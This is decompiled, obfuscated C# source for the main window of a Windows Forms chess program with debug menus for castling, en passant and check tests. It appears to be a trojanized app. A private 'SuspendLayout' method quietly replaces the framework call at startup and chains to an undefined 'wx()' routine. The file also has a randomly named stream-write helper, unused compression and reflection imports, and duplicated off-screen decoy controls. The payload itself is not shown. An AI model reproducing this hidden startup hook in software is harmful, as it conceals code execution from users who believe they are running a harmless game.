using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Windows.Forms;
using SimpleChessApp.Game;

namespace SimpleChessApp;

public class MainForm : Form
{
	private enum GameControl
	{
		Restart,
		ClearBoard
	}

	private enum DebugItems
	{
		Passant,
		Castling,
		Promotion,
		Check,
		DiscoverCheck,
		CheckOnCastling
	}

	private IContainer components = null;

	private static MainForm rkQuAtdP2v2DC8XaJSe;

	private Label label1;

	private ToolStripMenuItem gameToolStripMenuItem;

	private ToolStripMenuItem restartToolStripMenuItem;

	private ToolStripMenuItem clearBoardToolStripMenuItem;

	private ToolStripMenuItem singlePieceToolStripMenuItem;

	private ToolStripMenuItem bishopToolStripMenuItem1;

	private ToolStripMenuItem rookToolStripMenuItem1;

	private ToolStripMenuItem queenToolStripMenuItem1;

	private ToolStripMenuItem knightToolStripMenuItem1;

	private ToolStripMenuItem kingToolStripMenuItem1;

	private ToolStripMenuItem passantToolStripMenuItem;

	private ToolStripMenuItem testsToolStripMenuItem;

	private ToolStripMenuItem castlingToolStripMenuItem;

	private ToolStripMenuItem promotionToolStripMenuItem;

	private MenuStrip menuStrip1;

	private ListBox listBox1;

	private ListBox listBox2;

	private BoardPanel designBoard2;

	private BoardPanel designBoard1;

	private ToolStripMenuItem checkToolStripMenuItem;

	private ToolStripMenuItem discoveredCheckToolStripMenuItem;

	private ToolStripMenuItem checkOnCastlingToolStripMenuItem;

	private BoardPanel boardPanel1;

	private BoardPanel boardPanel2;

	private ListBox listBox3;

	private ListBox listBox4;

	private Label label2;

	private MenuStrip menuStrip2;

	private ToolStripMenuItem toolStripMenuItem1;

	private ToolStripMenuItem toolStripMenuItem2;

	private ToolStripMenuItem toolStripMenuItem3;

	private ToolStripMenuItem toolStripMenuItem4;

	private ToolStripMenuItem toolStripMenuItem5;

	private ToolStripMenuItem toolStripMenuItem6;

	private ToolStripMenuItem toolStripMenuItem7;

	private ToolStripMenuItem toolStripMenuItem8;

	private ToolStripMenuItem toolStripMenuItem9;

	private ToolStripMenuItem toolStripMenuItem10;

	private ToolStripMenuItem toolStripMenuItem11;

	private ToolStripMenuItem toolStripMenuItem12;

	private ToolStripMenuItem toolStripMenuItem13;

	private ToolStripMenuItem toolStripMenuItem14;

	private ToolStripMenuItem toolStripMenuItem15;

	private ToolStripMenuItem toolStripMenuItem16;

	public MainForm()
	{
		InitializeComponent();
		MainForm.smethod_0((Control)(object)label1, "");
		MainForm.smethod_1((ToolStripItem)(object)knightToolStripMenuItem1, (EventHandler)Item_Click);
		MainForm.smethod_1((ToolStripItem)(object)queenToolStripMenuItem1, (EventHandler)Item_Click);
		MainForm.smethod_1((ToolStripItem)(object)kingToolStripMenuItem1, (EventHandler)Item_Click);
		MainForm.smethod_1((ToolStripItem)(object)bishopToolStripMenuItem1, (EventHandler)Item_Click);
		MainForm.smethod_1((ToolStripItem)(object)rookToolStripMenuItem1, (EventHandler)Item_Click);
		MainForm.smethod_1((ToolStripItem)(object)restartToolStripMenuItem, (EventHandler)Item_Click);
		MainForm.smethod_1((ToolStripItem)(object)clearBoardToolStripMenuItem, (EventHandler)Item_Click);
		MainForm.smethod_1((ToolStripItem)(object)promotionToolStripMenuItem, (EventHandler)Item_Click);
		MainForm.smethod_1((ToolStripItem)(object)castlingToolStripMenuItem, (EventHandler)Item_Click);
		MainForm.smethod_1((ToolStripItem)(object)passantToolStripMenuItem, (EventHandler)Item_Click);
		MainForm.smethod_1((ToolStripItem)(object)checkToolStripMenuItem, (EventHandler)Item_Click);
		MainForm.smethod_1((ToolStripItem)(object)discoveredCheckToolStripMenuItem, (EventHandler)Item_Click);
		MainForm.smethod_1((ToolStripItem)(object)checkOnCastlingToolStripMenuItem, (EventHandler)Item_Click);
		MainForm.smethod_2((ToolStripItem)(object)passantToolStripMenuItem, (object)DebugItems.Passant);
		MainForm.smethod_2((ToolStripItem)(object)castlingToolStripMenuItem, (object)DebugItems.Castling);
		MainForm.smethod_2((ToolStripItem)(object)promotionToolStripMenuItem, (object)DebugItems.Promotion);
		MainForm.smethod_2((ToolStripItem)(object)checkToolStripMenuItem, (object)DebugItems.Check);
		MainForm.smethod_2((ToolStripItem)(object)discoveredCheckToolStripMenuItem, (object)DebugItems.DiscoverCheck);
		MainForm.smethod_2((ToolStripItem)(object)checkOnCastlingToolStripMenuItem, (object)DebugItems.CheckOnCastling);
		MainForm.smethod_2((ToolStripItem)(object)restartToolStripMenuItem, (object)GameControl.Restart);
		MainForm.smethod_2((ToolStripItem)(object)clearBoardToolStripMenuItem, (object)GameControl.ClearBoard);
		MainForm.smethod_2((ToolStripItem)(object)knightToolStripMenuItem1, (object)Pieces.Knight);
		MainForm.smethod_2((ToolStripItem)(object)queenToolStripMenuItem1, (object)Pieces.Queen);
		MainForm.smethod_2((ToolStripItem)(object)kingToolStripMenuItem1, (object)Pieces.King);
		MainForm.smethod_2((ToolStripItem)(object)bishopToolStripMenuItem1, (object)Pieces.Bishop);
		MainForm.smethod_2((ToolStripItem)(object)rookToolStripMenuItem1, (object)Pieces.Rook);
		Square.Action += Square_Action;
		Color color_ = MainForm.smethod_3("#2D2D30");
		MainForm.smethod_4((Control)(object)this, color_);
		MainForm.smethod_5((Control)(object)this, Color.WhiteSmoke);
		MainForm.smethod_6((ToolStrip)(object)menuStrip1, color_);
		MainForm.smethod_7((ToolStrip)(object)menuStrip1, Color.WhiteSmoke);
	}

	private void Square_Action(object sender, EventArgs e)
	{
		MainForm.smethod_0((Control)(object)label1, MainForm.smethod_8(sender));
		fillListBox();
	}

	private void fillListBox()
	{
		MainForm.smethod_10(MainForm.smethod_9(listBox1));
		foreach (ChessPiece value in ChessContext.Core[0].ChessBoard.WhitePieces.Values)
		{
			MainForm.smethod_11(MainForm.smethod_9(listBox1), (object)value);
		}
		MainForm.smethod_12((ListControl)(object)listBox1, "SpecialName");
		MainForm.smethod_10(MainForm.smethod_9(listBox2));
		foreach (ChessPiece value2 in ChessContext.Core[0].ChessBoard.BlackPieces.Values)
		{
			MainForm.smethod_11(MainForm.smethod_9(listBox2), (object)value2);
		}
		MainForm.smethod_12((ListControl)(object)listBox2, "SpecialName");
	}

	private void Item_Click(object sender, EventArgs e)
	{
		ToolStripMenuItem x = (ToolStripMenuItem)((sender is ToolStripMenuItem) ? sender : null);
		handleDebug(x, ChessContext.Core[0]);
		handleDebug(x, ChessContext.Core[1]);
	}

	private void handleDebug(ToolStripMenuItem x, ChessCore w)
	{
		if (MainForm.smethod_13((ToolStripItem)(object)x) is GameControl)
		{
			GameControl gameControl = (GameControl)MainForm.smethod_13((ToolStripItem)(object)x);
			if (gameControl == GameControl.ClearBoard)
			{
				w.ChessBoard.ClearBoard();
			}
			if (gameControl == GameControl.Restart)
			{
				w.RestartGame();
			}
		}
		if (MainForm.smethod_13((ToolStripItem)(object)x) is DebugItems)
		{
			DebugItems debugItems = (DebugItems)MainForm.smethod_13((ToolStripItem)(object)x);
			if (debugItems == DebugItems.Passant)
			{
				w.TestPassant();
			}
			if (debugItems == DebugItems.Castling)
			{
				w.TestCastling();
			}
			if (debugItems == DebugItems.Promotion)
			{
				w.TestPromotion();
			}
			if (debugItems == DebugItems.Check)
			{
				w.TestCheck();
			}
			if (debugItems == DebugItems.DiscoverCheck)
			{
				w.TestDiscoverCheck();
			}
			if (debugItems == DebugItems.CheckOnCastling)
			{
				w.CheckOnCastling();
			}
		}
		if (MainForm.smethod_13((ToolStripItem)(object)x) is Pieces)
		{
			w.TestSinglePiece((Pieces)MainForm.smethod_13((ToolStripItem)(object)x));
		}
		fillListBox();
	}

	protected override void OnLoad(EventArgs e)
	{
		designBoard1.SetBoard((ImageLayout)2, flipped: false, allMoves: false, selected: true);
		designBoard2.SetBoard((ImageLayout)3, flipped: true, allMoves: true);
		ChessContext.Core.Add(new ChessCore(designBoard1.Board));
		ChessContext.Core.Add(new ChessCore(designBoard1.Board));
		fillListBox();
	}

	private void checkOnCastlingToolStripMenuItem_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			MainForm.smethod_14((IDisposable)components);
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_084a: Unknown result type (might be due to invalid IL or missing references)
		//IL_08c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_093b: Unknown result type (might be due to invalid IL or missing references)
		//IL_09b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_1114: Unknown result type (might be due to invalid IL or missing references)
		//IL_112c: Unknown result type (might be due to invalid IL or missing references)
		label1 = MainForm.smethod_15();
		gameToolStripMenuItem = MainForm.smethod_16();
		restartToolStripMenuItem = MainForm.smethod_16();
		clearBoardToolStripMenuItem = MainForm.smethod_16();
		testsToolStripMenuItem = MainForm.smethod_16();
		singlePieceToolStripMenuItem = MainForm.smethod_16();
		knightToolStripMenuItem1 = MainForm.smethod_16();
		kingToolStripMenuItem1 = MainForm.smethod_16();
		bishopToolStripMenuItem1 = MainForm.smethod_16();
		queenToolStripMenuItem1 = MainForm.smethod_16();
		rookToolStripMenuItem1 = MainForm.smethod_16();
		passantToolStripMenuItem = MainForm.smethod_16();
		castlingToolStripMenuItem = MainForm.smethod_16();
		promotionToolStripMenuItem = MainForm.smethod_16();
		checkToolStripMenuItem = MainForm.smethod_16();
		discoveredCheckToolStripMenuItem = MainForm.smethod_16();
		checkOnCastlingToolStripMenuItem = MainForm.smethod_16();
		menuStrip1 = MainForm.smethod_17();
		listBox1 = MainForm.smethod_18();
		listBox2 = MainForm.smethod_18();
		designBoard1 = new BoardPanel();
		designBoard2 = new BoardPanel();
		boardPanel1 = new BoardPanel();
		boardPanel2 = new BoardPanel();
		listBox3 = MainForm.smethod_18();
		listBox4 = MainForm.smethod_18();
		label2 = MainForm.smethod_15();
		menuStrip2 = MainForm.smethod_17();
		toolStripMenuItem1 = MainForm.smethod_16();
		toolStripMenuItem2 = MainForm.smethod_16();
		toolStripMenuItem3 = MainForm.smethod_16();
		toolStripMenuItem4 = MainForm.smethod_16();
		toolStripMenuItem5 = MainForm.smethod_16();
		toolStripMenuItem6 = MainForm.smethod_16();
		toolStripMenuItem7 = MainForm.smethod_16();
		toolStripMenuItem8 = MainForm.smethod_16();
		toolStripMenuItem9 = MainForm.smethod_16();
		toolStripMenuItem10 = MainForm.smethod_16();
		toolStripMenuItem11 = MainForm.smethod_16();
		toolStripMenuItem12 = MainForm.smethod_16();
		toolStripMenuItem13 = MainForm.smethod_16();
		toolStripMenuItem14 = MainForm.smethod_16();
		toolStripMenuItem15 = MainForm.smethod_16();
		toolStripMenuItem16 = MainForm.smethod_16();
		MainForm.smethod_19((Control)(object)menuStrip1);
		MainForm.smethod_19((Control)(object)menuStrip2);
		SuspendLayout();
		MainForm.smethod_20((Control)(object)label1, new Point(23, 50));
		MainForm.smethod_21((Control)(object)label1, "label1");
		MainForm.smethod_22((Control)(object)label1, new Size(436, 18));
		MainForm.smethod_23((Control)(object)label1, 11);
		MainForm.smethod_0((Control)(object)label1, "label1");
		MainForm.smethod_24(label1, (ContentAlignment)32);
		MainForm.smethod_26(MainForm.smethod_25((ToolStripDropDownItem)(object)gameToolStripMenuItem), (ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)restartToolStripMenuItem,
			(ToolStripItem)clearBoardToolStripMenuItem
		});
		MainForm.smethod_27((ToolStripItem)(object)gameToolStripMenuItem, "gameToolStripMenuItem");
		MainForm.smethod_28((ToolStripItem)(object)gameToolStripMenuItem, new Size(50, 20));
		MainForm.smethod_29((ToolStripItem)(object)gameToolStripMenuItem, "Game");
		MainForm.smethod_27((ToolStripItem)(object)restartToolStripMenuItem, "restartToolStripMenuItem");
		MainForm.smethod_28((ToolStripItem)(object)restartToolStripMenuItem, new Size(132, 22));
		MainForm.smethod_29((ToolStripItem)(object)restartToolStripMenuItem, "Restart");
		MainForm.smethod_27((ToolStripItem)(object)clearBoardToolStripMenuItem, "clearBoardToolStripMenuItem");
		MainForm.smethod_28((ToolStripItem)(object)clearBoardToolStripMenuItem, new Size(132, 22));
		MainForm.smethod_29((ToolStripItem)(object)clearBoardToolStripMenuItem, "ClearBoard");
		MainForm.smethod_26(MainForm.smethod_25((ToolStripDropDownItem)(object)testsToolStripMenuItem), (ToolStripItem[])(object)new ToolStripItem[7]
		{
			(ToolStripItem)singlePieceToolStripMenuItem,
			(ToolStripItem)passantToolStripMenuItem,
			(ToolStripItem)castlingToolStripMenuItem,
			(ToolStripItem)promotionToolStripMenuItem,
			(ToolStripItem)checkToolStripMenuItem,
			(ToolStripItem)discoveredCheckToolStripMenuItem,
			(ToolStripItem)checkOnCastlingToolStripMenuItem
		});
		MainForm.smethod_27((ToolStripItem)(object)testsToolStripMenuItem, "testsToolStripMenuItem");
		MainForm.smethod_28((ToolStripItem)(object)testsToolStripMenuItem, new Size(44, 20));
		MainForm.smethod_29((ToolStripItem)(object)testsToolStripMenuItem, "Tests");
		MainForm.smethod_26(MainForm.smethod_25((ToolStripDropDownItem)(object)singlePieceToolStripMenuItem), (ToolStripItem[])(object)new ToolStripItem[5]
		{
			(ToolStripItem)knightToolStripMenuItem1,
			(ToolStripItem)kingToolStripMenuItem1,
			(ToolStripItem)bishopToolStripMenuItem1,
			(ToolStripItem)queenToolStripMenuItem1,
			(ToolStripItem)rookToolStripMenuItem1
		});
		MainForm.smethod_27((ToolStripItem)(object)singlePieceToolStripMenuItem, "singlePieceToolStripMenuItem");
		MainForm.smethod_28((ToolStripItem)(object)singlePieceToolStripMenuItem, new Size(170, 22));
		MainForm.smethod_29((ToolStripItem)(object)singlePieceToolStripMenuItem, "Single Piece");
		MainForm.smethod_27((ToolStripItem)(object)knightToolStripMenuItem1, "knightToolStripMenuItem1");
		MainForm.smethod_28((ToolStripItem)(object)knightToolStripMenuItem1, new Size(110, 22));
		MainForm.smethod_29((ToolStripItem)(object)knightToolStripMenuItem1, "Knight");
		MainForm.smethod_27((ToolStripItem)(object)kingToolStripMenuItem1, "kingToolStripMenuItem1");
		MainForm.smethod_28((ToolStripItem)(object)kingToolStripMenuItem1, new Size(110, 22));
		MainForm.smethod_29((ToolStripItem)(object)kingToolStripMenuItem1, "King");
		MainForm.smethod_27((ToolStripItem)(object)bishopToolStripMenuItem1, "bishopToolStripMenuItem1");
		MainForm.smethod_28((ToolStripItem)(object)bishopToolStripMenuItem1, new Size(110, 22));
		MainForm.smethod_29((ToolStripItem)(object)bishopToolStripMenuItem1, "Bishop");
		MainForm.smethod_27((ToolStripItem)(object)queenToolStripMenuItem1, "queenToolStripMenuItem1");
		MainForm.smethod_28((ToolStripItem)(object)queenToolStripMenuItem1, new Size(110, 22));
		MainForm.smethod_29((ToolStripItem)(object)queenToolStripMenuItem1, "Queen");
		MainForm.smethod_27((ToolStripItem)(object)rookToolStripMenuItem1, "rookToolStripMenuItem1");
		MainForm.smethod_28((ToolStripItem)(object)rookToolStripMenuItem1, new Size(110, 22));
		MainForm.smethod_29((ToolStripItem)(object)rookToolStripMenuItem1, "Rook");
		MainForm.smethod_27((ToolStripItem)(object)passantToolStripMenuItem, "passantToolStripMenuItem");
		MainForm.smethod_28((ToolStripItem)(object)passantToolStripMenuItem, new Size(170, 22));
		MainForm.smethod_29((ToolStripItem)(object)passantToolStripMenuItem, "Passant");
		MainForm.smethod_27((ToolStripItem)(object)castlingToolStripMenuItem, "castlingToolStripMenuItem");
		MainForm.smethod_28((ToolStripItem)(object)castlingToolStripMenuItem, new Size(170, 22));
		MainForm.smethod_29((ToolStripItem)(object)castlingToolStripMenuItem, "Castling");
		MainForm.smethod_27((ToolStripItem)(object)promotionToolStripMenuItem, "promotionToolStripMenuItem");
		MainForm.smethod_28((ToolStripItem)(object)promotionToolStripMenuItem, new Size(170, 22));
		MainForm.smethod_29((ToolStripItem)(object)promotionToolStripMenuItem, "Promotion");
		MainForm.smethod_27((ToolStripItem)(object)checkToolStripMenuItem, "checkToolStripMenuItem");
		MainForm.smethod_28((ToolStripItem)(object)checkToolStripMenuItem, new Size(170, 22));
		MainForm.smethod_29((ToolStripItem)(object)checkToolStripMenuItem, "Check");
		MainForm.smethod_27((ToolStripItem)(object)discoveredCheckToolStripMenuItem, "discoveredCheckToolStripMenuItem");
		MainForm.smethod_28((ToolStripItem)(object)discoveredCheckToolStripMenuItem, new Size(170, 22));
		MainForm.smethod_29((ToolStripItem)(object)discoveredCheckToolStripMenuItem, "Discovered Check");
		MainForm.smethod_27((ToolStripItem)(object)checkOnCastlingToolStripMenuItem, "checkOnCastlingToolStripMenuItem");
		MainForm.smethod_28((ToolStripItem)(object)checkOnCastlingToolStripMenuItem, new Size(170, 22));
		MainForm.smethod_29((ToolStripItem)(object)checkOnCastlingToolStripMenuItem, "Check on Castling");
		MainForm.smethod_1((ToolStripItem)(object)checkOnCastlingToolStripMenuItem, (EventHandler)checkOnCastlingToolStripMenuItem_Click);
		MainForm.smethod_26(MainForm.smethod_30((ToolStrip)(object)menuStrip1), (ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)gameToolStripMenuItem,
			(ToolStripItem)testsToolStripMenuItem
		});
		MainForm.smethod_20((Control)(object)menuStrip1, new Point(10, 10));
		MainForm.smethod_21((Control)(object)menuStrip1, "menuStrip1");
		MainForm.smethod_22((Control)(object)menuStrip1, new Size(936, 24));
		MainForm.smethod_23((Control)(object)menuStrip1, 15);
		MainForm.smethod_0((Control)(object)menuStrip1, "menuStrip1");
		MainForm.smethod_32((Control)(object)listBox1, MainForm.smethod_31("Courier New", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		MainForm.smethod_33((ListControl)(object)listBox1, bool_0: true);
		MainForm.smethod_34(listBox1, 17);
		MainForm.smethod_20((Control)(object)listBox1, new Point(487, 37));
		MainForm.smethod_21((Control)(object)listBox1, "listBox1");
		MainForm.smethod_22((Control)(object)listBox1, new Size(113, 378));
		MainForm.smethod_23((Control)(object)listBox1, 16);
		MainForm.smethod_32((Control)(object)listBox2, MainForm.smethod_31("Courier New", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		MainForm.smethod_33((ListControl)(object)listBox2, bool_0: true);
		MainForm.smethod_34(listBox2, 17);
		MainForm.smethod_20((Control)(object)listBox2, new Point(606, 37));
		MainForm.smethod_21((Control)(object)listBox2, "listBox2");
		MainForm.smethod_22((Control)(object)listBox2, new Size(113, 378));
		MainForm.smethod_23((Control)(object)listBox2, 17);
		MainForm.smethod_4((Control)(object)designBoard1, Color.FromArgb(37, 37, 38));
		MainForm.smethod_20((Control)(object)designBoard1, new Point(10, 68));
		MainForm.smethod_35((Control)(object)designBoard1, new Padding(0));
		MainForm.smethod_21((Control)(object)designBoard1, "designBoard1");
		MainForm.smethod_22((Control)(object)designBoard1, new Size(460, 460));
		MainForm.smethod_23((Control)(object)designBoard1, 20);
		MainForm.smethod_36((Control)(object)designBoard2, (AnchorStyles)9);
		MainForm.smethod_4((Control)(object)designBoard2, Color.DarkSlateGray);
		MainForm.smethod_20((Control)(object)designBoard2, new Point(646, 50));
		MainForm.smethod_35((Control)(object)designBoard2, new Padding(0));
		MainForm.smethod_21((Control)(object)designBoard2, "designBoard2");
		MainForm.smethod_22((Control)(object)designBoard2, new Size(300, 300));
		MainForm.smethod_23((Control)(object)designBoard2, 19);
		MainForm.smethod_4((Control)(object)boardPanel1, Color.FromArgb(37, 37, 38));
		MainForm.smethod_20((Control)(object)boardPanel1, new Point(-224, -22));
		MainForm.smethod_35((Control)(object)boardPanel1, new Padding(0));
		MainForm.smethod_21((Control)(object)boardPanel1, "boardPanel1");
		MainForm.smethod_22((Control)(object)boardPanel1, new Size(690, 637));
		MainForm.smethod_23((Control)(object)boardPanel1, 25);
		MainForm.smethod_36((Control)(object)boardPanel2, (AnchorStyles)9);
		MainForm.smethod_4((Control)(object)boardPanel2, Color.DarkSlateGray);
		MainForm.smethod_20((Control)(object)boardPanel2, new Point(730, -47));
		MainForm.smethod_35((Control)(object)boardPanel2, new Padding(0));
		MainForm.smethod_21((Control)(object)boardPanel2, "boardPanel2");
		MainForm.smethod_22((Control)(object)boardPanel2, new Size(450, 415));
		MainForm.smethod_23((Control)(object)boardPanel2, 24);
		MainForm.smethod_32((Control)(object)listBox3, MainForm.smethod_31("Courier New", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		MainForm.smethod_33((ListControl)(object)listBox3, bool_0: true);
		MainForm.smethod_34(listBox3, 17);
		MainForm.smethod_20((Control)(object)listBox3, new Point(367, -79));
		MainForm.smethod_21((Control)(object)listBox3, "listBox3");
		MainForm.smethod_22((Control)(object)listBox3, new Size(113, 378));
		MainForm.smethod_23((Control)(object)listBox3, 23);
		MainForm.smethod_32((Control)(object)listBox4, MainForm.smethod_31("Courier New", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		MainForm.smethod_33((ListControl)(object)listBox4, bool_0: true);
		MainForm.smethod_34(listBox4, 17);
		MainForm.smethod_20((Control)(object)listBox4, new Point(248, -79));
		MainForm.smethod_21((Control)(object)listBox4, "listBox4");
		MainForm.smethod_22((Control)(object)listBox4, new Size(113, 378));
		MainForm.smethod_23((Control)(object)listBox4, 22);
		MainForm.smethod_20((Control)(object)label2, new Point(-216, -66));
		MainForm.smethod_21((Control)(object)label2, "label2");
		MainForm.smethod_22((Control)(object)label2, new Size(436, 18));
		MainForm.smethod_23((Control)(object)label2, 21);
		MainForm.smethod_0((Control)(object)label2, "label2");
		MainForm.smethod_24(label2, (ContentAlignment)32);
		MainForm.smethod_26(MainForm.smethod_30((ToolStrip)(object)menuStrip2), (ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)toolStripMenuItem1,
			(ToolStripItem)toolStripMenuItem4
		});
		MainForm.smethod_20((Control)(object)menuStrip2, new Point(10, 34));
		MainForm.smethod_21((Control)(object)menuStrip2, "menuStrip2");
		MainForm.smethod_22((Control)(object)menuStrip2, new Size(936, 24));
		MainForm.smethod_23((Control)(object)menuStrip2, 26);
		MainForm.smethod_0((Control)(object)menuStrip2, "menuStrip2");
		MainForm.smethod_26(MainForm.smethod_25((ToolStripDropDownItem)(object)toolStripMenuItem1), (ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)toolStripMenuItem2,
			(ToolStripItem)toolStripMenuItem3
		});
		MainForm.smethod_27((ToolStripItem)(object)toolStripMenuItem1, "toolStripMenuItem1");
		MainForm.smethod_28((ToolStripItem)(object)toolStripMenuItem1, new Size(50, 20));
		MainForm.smethod_29((ToolStripItem)(object)toolStripMenuItem1, "Game");
		MainForm.smethod_27((ToolStripItem)(object)toolStripMenuItem2, "toolStripMenuItem2");
		MainForm.smethod_28((ToolStripItem)(object)toolStripMenuItem2, new Size(132, 22));
		MainForm.smethod_29((ToolStripItem)(object)toolStripMenuItem2, "Restart");
		MainForm.smethod_27((ToolStripItem)(object)toolStripMenuItem3, "toolStripMenuItem3");
		MainForm.smethod_28((ToolStripItem)(object)toolStripMenuItem3, new Size(132, 22));
		MainForm.smethod_29((ToolStripItem)(object)toolStripMenuItem3, "ClearBoard");
		MainForm.smethod_26(MainForm.smethod_25((ToolStripDropDownItem)(object)toolStripMenuItem4), (ToolStripItem[])(object)new ToolStripItem[7]
		{
			(ToolStripItem)toolStripMenuItem5,
			(ToolStripItem)toolStripMenuItem11,
			(ToolStripItem)toolStripMenuItem12,
			(ToolStripItem)toolStripMenuItem13,
			(ToolStripItem)toolStripMenuItem14,
			(ToolStripItem)toolStripMenuItem15,
			(ToolStripItem)toolStripMenuItem16
		});
		MainForm.smethod_27((ToolStripItem)(object)toolStripMenuItem4, "toolStripMenuItem4");
		MainForm.smethod_28((ToolStripItem)(object)toolStripMenuItem4, new Size(44, 20));
		MainForm.smethod_29((ToolStripItem)(object)toolStripMenuItem4, "Tests");
		MainForm.smethod_26(MainForm.smethod_25((ToolStripDropDownItem)(object)toolStripMenuItem5), (ToolStripItem[])(object)new ToolStripItem[5]
		{
			(ToolStripItem)toolStripMenuItem6,
			(ToolStripItem)toolStripMenuItem7,
			(ToolStripItem)toolStripMenuItem8,
			(ToolStripItem)toolStripMenuItem9,
			(ToolStripItem)toolStripMenuItem10
		});
		MainForm.smethod_27((ToolStripItem)(object)toolStripMenuItem5, "toolStripMenuItem5");
		MainForm.smethod_28((ToolStripItem)(object)toolStripMenuItem5, new Size(170, 22));
		MainForm.smethod_29((ToolStripItem)(object)toolStripMenuItem5, "Single Piece");
		MainForm.smethod_27((ToolStripItem)(object)toolStripMenuItem6, "toolStripMenuItem6");
		MainForm.smethod_28((ToolStripItem)(object)toolStripMenuItem6, new Size(110, 22));
		MainForm.smethod_29((ToolStripItem)(object)toolStripMenuItem6, "Knight");
		MainForm.smethod_27((ToolStripItem)(object)toolStripMenuItem7, "toolStripMenuItem7");
		MainForm.smethod_28((ToolStripItem)(object)toolStripMenuItem7, new Size(110, 22));
		MainForm.smethod_29((ToolStripItem)(object)toolStripMenuItem7, "King");
		MainForm.smethod_27((ToolStripItem)(object)toolStripMenuItem8, "toolStripMenuItem8");
		MainForm.smethod_28((ToolStripItem)(object)toolStripMenuItem8, new Size(110, 22));
		MainForm.smethod_29((ToolStripItem)(object)toolStripMenuItem8, "Bishop");
		MainForm.smethod_27((ToolStripItem)(object)toolStripMenuItem9, "toolStripMenuItem9");
		MainForm.smethod_28((ToolStripItem)(object)toolStripMenuItem9, new Size(110, 22));
		MainForm.smethod_29((ToolStripItem)(object)toolStripMenuItem9, "Queen");
		MainForm.smethod_27((ToolStripItem)(object)toolStripMenuItem10, "toolStripMenuItem10");
		MainForm.smethod_28((ToolStripItem)(object)toolStripMenuItem10, new Size(110, 22));
		MainForm.smethod_29((ToolStripItem)(object)toolStripMenuItem10, "Rook");
		MainForm.smethod_27((ToolStripItem)(object)toolStripMenuItem11, "toolStripMenuItem11");
		MainForm.smethod_28((ToolStripItem)(object)toolStripMenuItem11, new Size(170, 22));
		MainForm.smethod_29((ToolStripItem)(object)toolStripMenuItem11, "Passant");
		MainForm.smethod_27((ToolStripItem)(object)toolStripMenuItem12, "toolStripMenuItem12");
		MainForm.smethod_28((ToolStripItem)(object)toolStripMenuItem12, new Size(170, 22));
		MainForm.smethod_29((ToolStripItem)(object)toolStripMenuItem12, "Castling");
		MainForm.smethod_27((ToolStripItem)(object)toolStripMenuItem13, "toolStripMenuItem13");
		MainForm.smethod_28((ToolStripItem)(object)toolStripMenuItem13, new Size(170, 22));
		MainForm.smethod_29((ToolStripItem)(object)toolStripMenuItem13, "Promotion");
		MainForm.smethod_27((ToolStripItem)(object)toolStripMenuItem14, "toolStripMenuItem14");
		MainForm.smethod_28((ToolStripItem)(object)toolStripMenuItem14, new Size(170, 22));
		MainForm.smethod_29((ToolStripItem)(object)toolStripMenuItem14, "Check");
		MainForm.smethod_27((ToolStripItem)(object)toolStripMenuItem15, "toolStripMenuItem15");
		MainForm.smethod_28((ToolStripItem)(object)toolStripMenuItem15, new Size(170, 22));
		MainForm.smethod_29((ToolStripItem)(object)toolStripMenuItem15, "Discovered Check");
		MainForm.smethod_27((ToolStripItem)(object)toolStripMenuItem16, "toolStripMenuItem16");
		MainForm.smethod_28((ToolStripItem)(object)toolStripMenuItem16, new Size(170, 22));
		MainForm.smethod_29((ToolStripItem)(object)toolStripMenuItem16, "Check on Castling");
		MainForm.smethod_37((ContainerControl)(object)this, new SizeF(9f, 18f));
		MainForm.smethod_38((ContainerControl)(object)this, (AutoScaleMode)1);
		MainForm.smethod_39((Form)(object)this, new Size(956, 536));
		MainForm.smethod_41(MainForm.smethod_40((Control)(object)this), (Control)(object)menuStrip2);
		MainForm.smethod_41(MainForm.smethod_40((Control)(object)this), (Control)(object)boardPanel1);
		MainForm.smethod_41(MainForm.smethod_40((Control)(object)this), (Control)(object)boardPanel2);
		MainForm.smethod_41(MainForm.smethod_40((Control)(object)this), (Control)(object)listBox3);
		MainForm.smethod_41(MainForm.smethod_40((Control)(object)this), (Control)(object)listBox4);
		MainForm.smethod_41(MainForm.smethod_40((Control)(object)this), (Control)(object)label2);
		MainForm.smethod_41(MainForm.smethod_40((Control)(object)this), (Control)(object)designBoard1);
		MainForm.smethod_41(MainForm.smethod_40((Control)(object)this), (Control)(object)designBoard2);
		MainForm.smethod_41(MainForm.smethod_40((Control)(object)this), (Control)(object)listBox2);
		MainForm.smethod_41(MainForm.smethod_40((Control)(object)this), (Control)(object)listBox1);
		MainForm.smethod_41(MainForm.smethod_40((Control)(object)this), (Control)(object)label1);
		MainForm.smethod_41(MainForm.smethod_40((Control)(object)this), (Control)(object)menuStrip1);
		MainForm.smethod_32((Control)(object)this, MainForm.smethod_31("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		MainForm.smethod_42((Form)(object)this, new Padding(4));
		MainForm.smethod_43((Control)(object)this, "MainForm");
		MainForm.smethod_44((Control)(object)this, new Padding(10));
		MainForm.smethod_45((Form)(object)this, (FormStartPosition)1);
		MainForm.smethod_0((Control)(object)this, "SimpleChessApp");
		MainForm.smethod_46((Form)(object)this, (FormWindowState)2);
		MainForm.smethod_47((Control)(object)menuStrip1, bool_0: false);
		MainForm.smethod_48((Control)(object)menuStrip1);
		MainForm.smethod_47((Control)(object)menuStrip2, bool_0: false);
		MainForm.smethod_48((Control)(object)menuStrip2);
		MainForm.smethod_49((Control)(object)this, bool_0: false);
		MainForm.smethod_50((Control)(object)this);
	}

	private void SuspendLayout()
	{
		Application_Parameters();
	}

	private static void Application_Parameters()
	{
		wx();
	}

	internal static void lhcV8xdREPyCL3VmioD(Stream A_0, byte[] A_1, int A_2, int A_3)
	{
		MainForm.smethod_51(A_0, A_1, A_2, A_3);
	}

